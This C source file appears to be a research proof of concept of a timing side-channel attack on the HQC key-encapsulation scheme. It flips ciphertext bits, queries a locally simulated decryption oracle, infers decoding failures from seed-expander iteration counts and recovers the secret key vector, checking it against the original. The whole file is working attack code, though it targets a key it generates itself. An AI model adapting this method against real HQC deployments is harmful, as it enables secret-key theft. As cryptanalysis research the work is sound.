#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <assert.h>
#include <math.h>

#include <sys/random.h>
#include <unistd.h>
#include <getopt.h>
#include <signal.h>

#include "parameters.h"
#include "api.h"
#include "parsing.h"
#include "hqc.h"
#include "gf2x.h"
#include "code.h"
#include "vector.h"
#include "../lib/fips202/fips202.h"
#include "shake_prng.h"
#include "shake_ds.h"

#include <immintrin.h>
#include <x86intrin.h>

#include <openssl/rsa.h>
#include <openssl/engine.h>
#include <openssl/bn.h>

#include "exploit_util/constants.h"
#include "exploit_util/util.c"
#include "exploit_util/isa.c"
#include "exploit_util/vec.c"
#include "exploit_util_local/crypto_util.c"

typedef uint64_t u64;
typedef int64_t i64;

int main(void)
{
  unsigned char pk[PUBLIC_KEY_BYTES];
  unsigned char sk[SECRET_KEY_BYTES];

  // crypto_kem_keypair(pk, sk);
  int select_bad_key = 0;
  while (1) {
    crypto_kem_keypair(pk, sk);
    if (select_bad_key)
    {
      __m256i y_orig[VEC_N_256_SIZE_64 >> 2] = {0};
      __m256i x_orig[VEC_N_256_SIZE_64 >> 2] = {0};
      bzero(x_orig, sizeof x_orig);
      bzero(y_orig, sizeof y_orig);
      //uint8_t *y_orig_bytes = (uint8_t*)y_orig;
      // uint8_t *x_resized_bytes = (uint8_t*)x_orig;
      {
        uint8_t pk[PUBLIC_KEY_BYTES] = {0};
        // Retrieve x, y, pk from secret key
        hqc_secret_key_from_string(x_orig, y_orig, pk, sk);
      }

      int all0 = 1;
      for (int i = VEC_N1N2_256_SIZE_64; i < VEC_N_256_SIZE_64; ++i) {
        if (((uint64_t*)y_orig)[i] != 0) {
          all0 = 0;
          break;
        }
      }
      if (!all0) {
        break;
      }
    } else {
      break;
    }
  }

  {
    unsigned char ct[CIPHERTEXT_BYTES];
    unsigned char key1[SHARED_SECRET_BYTES];
    unsigned char key2[SHARED_SECRET_BYTES];
    crypto_kem_enc(ct, key1, pk);
    crypto_kem_dec(key2, ct, sk);
    check_key(key1, key2, SHARED_SECRET_BYTES);
  }

  // we aim to recover y
  __m256i y_orig[VEC_N_256_SIZE_64 >> 2] = {0};
  __m256i x_orig[VEC_N_256_SIZE_64 >> 2] = {0};
  bzero(x_orig, sizeof x_orig);
  bzero(y_orig, sizeof y_orig);
  uint8_t *y_orig_bytes = (uint8_t*)y_orig;
  // uint8_t *x_resized_bytes = (uint8_t*)x_orig;
  {
    uint8_t pk[PUBLIC_KEY_BYTES] = {0};
    // Retrieve x, y, pk from secret key
    hqc_secret_key_from_string(x_orig, y_orig, pk, sk);
  }
  {
    unsigned char ct[CIPHERTEXT_BYTES];
    unsigned char ss[SHARED_SECRET_BYTES];
    unsigned char ss2[SHARED_SECRET_BYTES];
    crypto_kem_enc(ct, ss, pk);
    crypto_kem_dec_sk(ss2, ct, pk, y_orig);
    puts("Checking modified decaps function...");
    check_key(ss, ss2, sizeof ss);
  }

  uint64_t m[VEC_K_SIZE_64] __attribute__ ((aligned (32))) = {0};
  size_t decryption_oracle_calls = 0;
  __m256i recovered_y[VEC_N_256_SIZE_64 >> 2] = {0};
  uint8_t *recovered_y_bytes = (uint8_t*)recovered_y;
  bzero(recovered_y_bytes, sizeof recovered_y);

  uint64_t u[VEC_N_256_SIZE_64] __attribute__ ((aligned (32))) = {0};
  bzero(u, sizeof u);
  u[0] = 1;
  uint64_t v[VEC_N_256_SIZE_64] __attribute__ ((aligned (32))) = {0};
  uint8_t *v_bytes = (uint8_t *)v;
  bzero(v, sizeof v);
  unsigned char d[SHAKE256_512_BYTES] = {0};
  bzero(d, sizeof d);

  unsigned char ct[CIPHERTEXT_BYTES];

  size_t blocks_order[PARAM_N1];
  for (int k = 0; k < PARAM_N1; ++k)
  {
    blocks_order[k] = k;
  }

  size_t mismatches = 0;
  //size_t same_counts = 0;
  //size_t same_counts_ti = 0;
  //size_t blocks_count = 0;
  size_t skipped_blocks = 0;
  //size_t decode_prediction_failures = 0;

  size_t counters[PARAM_N1N2];
  size_t results[PARAM_N1N2];
  bzero(results, sizeof results);
  bzero(counters, sizeof results);
  size_t total_weight = 0;

  bzero(m, sizeof m);
  find_message(m, 3, 1000000);
  struct timing_info ti1 = message_timing(m);

  {
    unsigned char key1[SHARED_SECRET_BYTES];
    crypto_kem_enc_m(0, m, ct, key1, pk);
  }

  size_t majority_of = 5;
  size_t majority_min = (majority_of + 1) / 2;
  for (size_t k = 0; k < majority_of; ++k)
  {
    bzero(v, sizeof v);
    code_encode(v, m);
    bzero(recovered_y, sizeof recovered_y);
    int corrupt_start = 0;           // inclusive
    int corrupt_end = PARAM_DELTA;   // exclusive
    int recover_start = PARAM_DELTA; // inclusive
    int recover_end = PARAM_N1;      // exclusive
    shuffle(blocks_order, PARAM_N1);
    for (int twice = 0; twice < 2 && total_weight < PARAM_OMEGA; ++twice) {
      // Construct ciphertext with delta erroneous blocks
      for (int i = corrupt_start; i < corrupt_end; ++i)
      {
        for (int j = 0; j < PARAM_N2; ++j)
        {
          flip_bit(v_bytes, blocks_order[i] * PARAM_N2 + j);
        }
      }

      int all_majority_global = 0;
      while (!all_majority_global) {
        // Flipping any more blocks will cause a decryption failure
        // We can check whether a repetition-code word still decodes correctly
        // by flipping bits until it fails to decrypt

        total_weight = 0;

        for (int i2 = 0; i2 < PARAM_N1N2; ++i2) {
          total_weight += results[i2] >= majority_min;
        }

        if (total_weight >= PARAM_OMEGA) {
          printf("Finished because total weight of %zu achieved (omega = %d)\n", total_weight, PARAM_OMEGA);
          break;
        }

        all_majority_global = 1;
        for (int i = recover_start; i < recover_end; ++i) {
          // For each repetition code block, find out the errors in that block
          size_t block_num = blocks_order[i];
          int all_majority = 1;
          for (size_t j = 0; j < PARAM_N2; ++j)
          {
            size_t pos = block_num * PARAM_N2 + j;
            // If there is no majority for 1 or 0
            if (results[pos] < majority_min && (counters[pos] - results[pos]) < majority_min)
            {
              all_majority = 0;
              all_majority_global = 0;
              break;
            }
          }
          if (all_majority)
          {
            skipped_blocks++;
            continue; // Skip block
          }

          // Original attack on this block
          // Determine a random walk to flip bits in the current block
          size_t bit_order[PARAM_N2];
          for (int k = 0; k < PARAM_N2; ++k)
          {
            bit_order[k] = k;
          }
          shuffle(bit_order, PARAM_N2);

          // Flip bits in predetermined order until decoding failure


          size_t l = 0;
          for (; l < PARAM_N2; ++l) {
            size_t bit_flip_pos =
              block_num * PARAM_N2 + // flip bits in the current block
              bit_order[l]; // flip the bits in the predetermined order
            flip_bit(v_bytes, bit_flip_pos);

            uint64_t m2[VEC_K_SIZE_64] = {0};
            bzero(m2, sizeof m2);
            hqc_ciphertext_to_string(ct, u, v, d);
            crypto_kem_dec_m(m2, ct, sk);
            ++decryption_oracle_calls;
            struct timing_info ti2 = message_timing(m2);

            // print_hex0(m2, sizeof m2);
            // print_hex0(m, sizeof m);
            if (memcmp(m2, m, VEC_K_SIZE_BYTES) == 0) {
              int expect = ti1.seed_expander_iters == ti2.seed_expander_iters;
              if (!expect) {
                printf("Timing %lu === %lu ? %s\n", ti1.seed_expander_iters, ti2.seed_expander_iters, expect ? "yes" : "NO");
                puts("This should never happen! gu7iLhem03Xy8ds9mgZTB1wTYfZi6f5X");
                exit(1);
              }
            } else {
              int expect = ti1.seed_expander_iters != ti2.seed_expander_iters;
              if (!expect) {
                printf("Timing %lu =/= %lu ? %s\n", ti1.seed_expander_iters, ti2.seed_expander_iters, expect ? "yes" : "NO");
                puts("Failed to detect message changing");
                // exit(1);
              }
            }

            if (ti1.seed_expander_iters != ti2.seed_expander_iters) {
              printf("Took %zu bit flips to obtain decoding failure\n", l);
              // Now flip every bit in that block to check if it is an error
              for (size_t j = 0; j < PARAM_N2; ++j) {
                size_t bit_flip_pos =
                  block_num * PARAM_N2 + // flip bits in the current block
                  j; // flip the j-th bit
                flip_bit(v_bytes, bit_flip_pos);

                uint64_t m3[VEC_K_SIZE_64] = {0};
                bzero(m3, sizeof m3);
                hqc_ciphertext_to_string(ct, u, v, d);
                crypto_kem_dec_m(m3, ct, sk);
                ++decryption_oracle_calls;
                struct timing_info ti3 = message_timing(m3);
                int expect_error_ti = ti3.seed_expander_iters == ti1.seed_expander_iters;

                int our_error = 0;
                for (size_t w = 0; w <= l; ++w) {
                  if (bit_order[w] == j) {
                    our_error = 1;
                    break;
                  }
                }

                if (expect_error_ti) {
                  // the bit we flipped is an error in the modified ciphertext!
                  // If we flipped the bit, then it is not an error in the original message
                  // is_error (in the original ciphertext) = expect_error_ti XOR our_error = !our_error (since expect_error_ti is 1)
                  int is_error = !our_error;
                  results[block_num * PARAM_N2 + j] += is_error;
                  counters[block_num * PARAM_N2 + j] += 1;
                }

                {
                  // For debugging only
                  // if the modified ciphertext decrypts back to the original message
                  // after flipping a bit back
                  // then that bit is an error in the modified ciphertext
                  int expect_error = memcmp(m3, m, VEC_K_SIZE_BYTES) == 0;
                  int set_in_y = (y_orig_bytes[j / 8] >> (j % 8)) & 1;
                  int should_be_error = our_error ^ set_in_y;

                  // printf("                                                      %d %d\n", our_error, set_in_y);
                  if (expect_error && !should_be_error) {
                    // printf("False positive: %05zu is NOT an error, but was detected as such\n", j);
                    // ++fp;
                    // exit(1);
                  } else if (!expect_error && should_be_error) {
                    // printf("False negative: %05zu is an error, but was NOT detected as such\n", j);
                    // ++fn;
                    // exit(1);
                  } else {
                    // printf("Successfully identified true ");
                    if (expect_error && should_be_error) {
                      // printf("positive");
                      // ++tp;
                    } else if (!expect_error && !should_be_error) {
                      // printf("negative");
                      // ++tn;
                    } else {
                      puts("This should never happen! ULEEItTT61QaBrvfudw6wBMCMY6E1Gr2");
                      exit(1);
                    }
                    // printf(" bit %05zu\n", j);
                  }

                  if (expect_error_ti && !should_be_error) {
                    // printf("TI False positive: %05zu is NOT an error, but was detected as such\n", j);
                    // ++new_fp;
                    // ++fp_ti;
                    // exit(1);
                  } else if (!expect_error_ti && should_be_error) {
                    // printf("False negative: %05zu is an error, but was NOT detected as such\n", j);
                    // ++fn_ti;
                    // exit(1);
                  } else {
                    // printf("Successfully identified bit %05zu\n", j);
                    if (expect_error_ti && should_be_error) {
                      // ++tp_ti;
                    } else if (!expect_error_ti && !should_be_error) {
                      // ++tn_ti;
                    } else {
                      puts("WHAT 81827 ?!?!");
                      exit(1);
                    }
                  }
                }
                flip_bit(v_bytes, bit_flip_pos);
              }

              // Flip everything back
              for (size_t j = 0; j <= l; ++j) {
                size_t bit_flip_pos =
                  block_num * PARAM_N2 + // flip bits in the current block
                  bit_order[j]; // flip the bits in the predetermined order
                flip_bit(v_bytes, bit_flip_pos);
              }
              break;
            }
          }

          printf("Iteration %ld/%ld block %ld\n", k + 1, majority_of, blocks_order[i]);
          printf("Skipped count: %ld\n", skipped_blocks);
          printf("Decryption oracle calls: %ld\n", decryption_oracle_calls);
          puts("");
        }
      }

      // Reset for second iteration
      for (int i = corrupt_start; i < corrupt_end; ++i)
      {
        for (int j = 0; j < PARAM_N2; ++j)
        {
          flip_bit(v_bytes, blocks_order[i] * PARAM_N2 + j);
        }
      }

      corrupt_start = PARAM_DELTA;
      corrupt_end = PARAM_DELTA * 2;
      recover_start = 0;
      recover_end = PARAM_DELTA;
    }
  }

  bzero(recovered_y_bytes, VEC_N_SIZE_BYTES);
  for (size_t i = 0; i < PARAM_N1N2; ++i)
  {
    if (results[i] >= majority_min)
    {
      set_bit(recovered_y_bytes, i, 1);
    }
  }

  {
    printf("Partial success: %d\n", memcmp(recovered_y_bytes, y_orig_bytes, VEC_N1N2_SIZE_BYTES) == 0);
    puts("Recovering remaining bits");
    unsigned char ct[CIPHERTEXT_BYTES];
    unsigned char ss[SHARED_SECRET_BYTES];
    unsigned char ss2[SHARED_SECRET_BYTES];
    crypto_kem_enc(ct, ss, pk);

    Vecs vs = generate_inside_patterns();
    int found = 0;
    for (size_t i = 0; i < vs.len && !found; ++i) {
      Vec pattern = vs.v[i];

      for (size_t j = 0; j < pattern.len; ++j) {
        flip_bit(recovered_y_bytes, PARAM_N1N2 + pattern.v[j]);
      }

      // Check if key is usable
      // pk should be the same
      crypto_kem_dec_sk(ss2, ct, pk, recovered_y);
      if (memcmp(ss, ss2, sizeof ss) == 0) {
        puts("");
        puts("Inside error pattern:");
        vec_print(pattern);
        found = 1;
        break;
      }

      if (memcmp(recovered_y_bytes, y_orig_bytes, VEC_N_SIZE_BYTES) == 0) {
        puts("Should have exited the loop!");
        exit(1);
      }

      for (size_t j = 0; j < pattern.len; ++j) {
        flip_bit(recovered_y_bytes, PARAM_N1N2 + pattern.v[j]);
      }
    }
    if (!found) {
      puts("None of the inside error patterns match!");
    }
    vecs_free(&vs);
  }

  int success = memcmp(recovered_y_bytes, y_orig_bytes, VEC_N_SIZE_BYTES) == 0;
  puts("Recovered");
  print_hex0(recovered_y_bytes, VEC_N_SIZE_BYTES);
  puts("Original:");
  print_hex0(y_orig_bytes, VEC_N_SIZE_BYTES);
  puts("Differences:");
  vect_add((uint64_t*)recovered_y, (uint64_t*)recovered_y, (uint64_t*)y_orig, VEC_N_SIZE_BYTES);
  print_hex0(recovered_y_bytes, VEC_N_SIZE_BYTES);

  puts("Done.");
  printf("Success? %d\n", success);
  printf("Oracle calls %ld\n", decryption_oracle_calls);
  printf("Timing mismatches: %ld\n", mismatches);

  uint64_t bits_wrong = 0;
  for (int i = 0; i < VEC_N_SIZE_BYTES; ++i) {
    bits_wrong += __builtin_popcount(recovered_y_bytes[i]);
  }

  printf("Final classification: %lu bits wrong\n", bits_wrong);
}